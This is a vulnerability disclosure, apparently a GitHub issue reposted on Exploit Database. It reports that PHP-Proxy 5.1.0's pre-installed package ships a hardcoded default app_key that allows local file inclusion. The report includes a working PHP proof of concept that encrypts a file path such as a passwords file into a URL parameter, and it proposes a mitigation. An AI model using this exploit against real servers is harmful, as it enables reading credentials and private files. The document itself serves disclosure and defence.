## Description

[![@ameerpornillos](https://avatars.githubusercontent.com/u/44928938?u=34e65d98aad41996960d031577dadcaeaa060cec&v=4&size=48)](/ameerpornillos)[ameerpornillos](https://github.com/ameerpornillos)opened [on Nov 13, 2018](https://github.com/Athlon1600/php-proxy-app/issues/134#issue-380050962)
### Brief description of this vulnerability:

Downloadable pre-installed version of PHP-Proxy 5.1.0 (current as of this posting day) from [www.php-proxy.com](http://www.php-proxy.com) (<https://www.php-proxy.com/download/php-proxy.zip>) make use of a default app\_key wherein can be used for local file inclusion attacks. This can be used to generate encrypted string which can gain access to arbitrary local files in the server. (example: *<http://php-proxy-site/php-proxy/index.php?q=><encrypted\_string\_value>*)

### Affected Version:

**5.1.0** (pre-installed version)

### Reason of this vulnerability:

The downloadable pre-installed version of **PHP-Proxy 5.1.0** (current pre-installed version as of this posting day) from [www.php-proxy.com](http://www.php-proxy.com) (<https://www.php-proxy.com/download/php-proxy.zip>) already contains the default app\_key in config.php file which might be used by several users using the application thus is vulnerable to local file inclusion.

```
//default app_key from config.php file
$config['app_key'] = 'aeb067ca0aa9a3193dce3a7264c90187';

```

Encrypted URL value lies on the app\_key as seen on a snippet of code below.

```
//encryption function of the application
$url = str_rot_pass($url, $key);

```

Wherein which the key is the encryption\_key and by default, its value depends on the md5 hash of app\_key and the visiting IP address.

```
//encryption_key depends on which default url_mode is set to 2 depends on the md5 hash of the app_key and IP address
Config::set('encryption_key', md5(Config::get('app_key').$_SERVER['REMOTE_ADDR']));

```

Combining all the functions above, an encrypted URL can be generated which contains the local file inclusion vulnerability payload.

**Proof of Concept:**

Code below will output an encrypted string which can exploit the local file inclusion vulnerability. Add the encrypted string on the PHP-Proxy 5.1.0 application URL: example: *<http://192.168.0.130/php-proxy/index.php?q=><encrypted\_string\_value>* (replace <encrypted\_string\_value> with the generated encrypted string value)

```
<?php
$file = "file:///C:/xampp/passwords.txt"; //example target file to read
$ip = "192.168.0.1"; //change depending on your IP address that access the app
$app_key = "aeb067ca0aa9a3193dce3a7264c90187";
$key = md5($app_key.$ip);
function str_rot_pass($str, $key, $decrypt = false){
    $key_len = strlen($key);
    $result = str_repeat(' ', strlen($str));
    for($i=0; $i<strlen($str); $i++){
        if($decrypt){
            $ascii = ord($str[$i]) - ord($key[$i % $key_len]);
        } else {
            $ascii = ord($str[$i]) + ord($key[$i % $key_len]);
        }
        $result[$i] = chr($ascii);
    }
    return $result;
}
function base64_url_encode($input){
    return rtrim(strtr(base64_encode($input), '+/', '-_'), '=');
}
echo base64_url_encode(str_rot_pass($file, $key));
?>

```

Below screenshot is an example of gaining an encrypted URL string within which used to read the C:/xampp/passwords.txt of the server.

### Impact:

Gain access to arbitrary local files in the server.

### Suggested Mitigation:

There is already a setup.txt included on the downloadable pre-installed version of PHP-Proxy which will generate and overwrite the default app\_key, however users most probably don't use it and kept on using the default app\_key.

Possible mitigation is make the app\_key value in the config.php blank and make users just make use of the setup.txt to generate and overwrite the default app\_key.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
